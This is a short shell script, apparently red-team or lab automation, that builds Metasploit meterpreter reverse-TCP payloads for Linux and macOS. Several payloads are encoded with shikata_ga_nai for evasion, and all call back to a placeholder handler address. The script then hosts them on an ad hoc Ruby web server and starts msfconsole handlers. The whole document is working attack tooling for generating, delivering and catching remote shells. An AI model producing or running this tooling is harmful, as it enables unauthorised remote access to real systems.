echo  "creating the payloads"
mkdir linux macos
cd linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -e x86/shikata_ga_nai -i 19 -f elf > linuxm_staged_shi_iter.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -e x86/shikata_ga_nai -f elf > m_staged_shi.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4444 -f elf > m_staged.elf

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -i 19 -f elf > m_shi_iter.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -e x86/shikata_ga_nai -f elf > m_shi.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=HANDLER_IP LPORT=4343 -f elf > m.elf

cd ../macos
msfvenom -p python/meterpreter/reverse_tcp LHOST=HANDLER_IP LPORT=4545 > py_meter.py

echo "starting web server"
ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => WEBSERVER_PORT, :DocumentRoot => Dir.pwd).start' &

echo "starting MSF"
msfconsole -r ./all_the_handlers.rc